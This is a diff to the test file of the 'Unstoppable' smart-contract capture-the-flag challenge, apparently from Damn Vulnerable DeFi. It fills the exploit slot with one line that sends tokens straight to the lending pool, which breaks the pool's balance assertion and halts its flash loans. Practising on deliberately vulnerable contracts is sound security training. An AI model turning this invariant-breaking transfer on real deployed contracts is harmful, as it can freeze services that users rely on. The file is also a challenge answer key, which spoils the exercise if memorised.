@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Directly transfer DamnValuableToken to the Lender and bypass depositTokens
+        // This will break the poolBalance == balanceBefore assertion
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
     });
 
     after(async function () {
